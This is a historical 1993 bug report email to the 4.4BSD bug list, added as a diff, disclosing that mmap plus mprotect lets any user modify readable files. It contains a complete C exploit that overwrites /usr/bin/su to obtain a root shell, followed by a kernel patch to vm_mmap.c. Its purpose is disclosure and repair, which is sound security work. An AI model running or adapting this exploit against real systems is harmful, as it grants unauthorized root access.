@@ -1,0 +1,176 @@
+From yval@cs.huji.ac.il  Tue Feb 23 04:04:58 1993
+Date: Tue, 23 Feb 93 14:06:00 +0200
+From: Yuval Yarom <yval@CS.HUJI.AC.IL>
+To: 4bsd-bugs@okeeffe.CS.Berkeley.EDU
+Subject: mmap + mprotect security hole.
+Index: sys 4.4BSD-alpha
+
+Shalom,
+  The combination of mmap, and mprotect enables any user to modify all
+readable files in the system. The following program uses this hole
+to get a root shell:
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+
+#define SU "/usr/bin/su"
+#define TSU "/tmp/su"
+
+main(c,v)
+	int c;
+	char **v;
+{
+	if (getuid() == 0) {
+		copy(TSU, 0);
+		unlink(TSU);
+		execl("/bin/csh", "csh", 0);
+	}
+
+	if (geteuid() == 0) {
+		setreuid(0, 0);
+		execl(v[1], v[1], 0);
+	}
+
+	copy(v[0], 1);
+	execl(SU, SU, v[0], 0);
+}
+
+copy(from, save)
+	char *from;
+	int save;
+{
+	struct stat sb;
+	int fd;
+	caddr_t addr;
+	
+	stat(from, &sb);
+	fd = open(SU, O_RDONLY);
+	addr = mmap(0, sb.st_size, PROT_READ, MAP_FILE|MAP_SHARED, fd, 0);
+	mprotect(addr, sb.st_size, PROT_READ|PROT_WRITE);
+	close(fd);
+	if (save) {
+		fd = open(TSU, O_RDWR|O_CREAT|O_TRUNC, 0600);
+		write(fd, addr, sb.st_size);
+		close(fd);
+	}
+	fd = open(from, O_RDONLY);
+	if (fd < 0) {
+		perror(from);
+		exit(1);
+	}
+	read(fd, addr, sb.st_size);
+	close(fd);
+}
+
+The following patch fixes the problem by replacing MAP_SHARED with MAP_PRIVATE
+if the user cannot write to the file.  It would probably be better to pass
+vm_mmap another argument, and set max_protection on the region.
+
+				Yuval
+----------------------------------------------------------------
+*** vm_mmap.c.orig	Tue Feb 23 17:26:53 1993
+--- vm_mmap.c	Tue Feb 23 17:31:09 1993
+***************
+*** 123,128 ****
+--- 123,129 ----
+  	vm_prot_t prot;
+  	caddr_t handle;
+  	int mtype, error;
++ 	int flags = uap->flags;
+  
+  #ifdef DEBUG
+  	if (mmapdebug & MDB_FOLLOW)
+***************
+*** 133,139 ****
+  	/*
+  	 * Make sure one of the sharing types is specified
+  	 */
+! 	mtype = uap->flags & MAP_TYPE;
+  	switch (mtype) {
+  	case MAP_FILE:
+  	case MAP_ANON:
+--- 134,140 ----
+  	/*
+  	 * Make sure one of the sharing types is specified
+  	 */
+! 	mtype = flags & MAP_TYPE;
+  	switch (mtype) {
+  	case MAP_FILE:
+  	case MAP_ANON:
+***************
+*** 146,152 ****
+  	 * Size is implicitly rounded to a page boundary.
+  	 */
+  	addr = (vm_offset_t) uap->addr;
+! 	if ((uap->flags & MAP_FIXED) && (addr & page_mask) || uap->len < 0)
+  		return(EINVAL);
+  	size = (vm_size_t) round_page(uap->len);
+  	/*
+--- 147,153 ----
+  	 * Size is implicitly rounded to a page boundary.
+  	 */
+  	addr = (vm_offset_t) uap->addr;
+! 	if ((flags & MAP_FIXED) && (addr & page_mask) || uap->len < 0)
+  		return(EINVAL);
+  	size = (vm_size_t) round_page(uap->len);
+  	/*
+***************
+*** 156,162 ****
+  	 * There should really be a pmap call to determine a reasonable
+  	 * location.
+  	 */
+! 	if (addr == 0 && (uap->flags & MAP_FIXED) == 0)
+  		addr = round_page(p->p_vmspace->vm_daddr + MAXDSIZ);
+  	/*
+  	 * Mapping file or named anonymous, get fp for validation
+--- 157,163 ----
+  	 * There should really be a pmap call to determine a reasonable
+  	 * location.
+  	 */
+! 	if (addr == 0 && (flags & MAP_FIXED) == 0)
+  		addr = round_page(p->p_vmspace->vm_daddr + MAXDSIZ);
+  	/*
+  	 * Mapping file or named anonymous, get fp for validation
+***************
+*** 185,193 ****
+  		 * if mapping is shared.
+  		 */
+  		if ((uap->prot & PROT_READ) && (fp->f_flag & FREAD) == 0 ||
+! 		    ((uap->flags & MAP_SHARED) &&
+  		     (uap->prot & PROT_WRITE) && (fp->f_flag & FWRITE) == 0))
+  			return(EACCES);
+  		handle = (caddr_t)vp;
+  	} else if (uap->fd != -1)
+  		handle = (caddr_t)fp;
+--- 186,196 ----
+  		 * if mapping is shared.
+  		 */
+  		if ((uap->prot & PROT_READ) && (fp->f_flag & FREAD) == 0 ||
+! 		    ((flags & MAP_SHARED) &&
+  		     (uap->prot & PROT_WRITE) && (fp->f_flag & FWRITE) == 0))
+  			return(EACCES);
++ 		if ((flags & MAP_SHARED) && (fp->f_flag & FWRITE) == 0)
++ 			flags = (flags & ~MAP_SHARED) | MAP_PRIVATE;
+  		handle = (caddr_t)vp;
+  	} else if (uap->fd != -1)
+  		handle = (caddr_t)fp;
+***************
+*** 205,211 ****
+  		prot |= VM_PROT_EXECUTE;
+  
+  	error = vm_mmap(&p->p_vmspace->vm_map, &addr, size, prot,
+! 			uap->flags, handle, (vm_offset_t)uap->pos);
+  	if (error == 0)
+  		*retval = (int) addr;
+  	return(error);
+--- 208,214 ----
+  		prot |= VM_PROT_EXECUTE;
+  
+  	error = vm_mmap(&p->p_vmspace->vm_map, &addr, size, prot,
+! 			flags, handle, (vm_offset_t)uap->pos);
+  	if (error == 0)
+  		*retval = (int) addr;
+  	return(error);
+
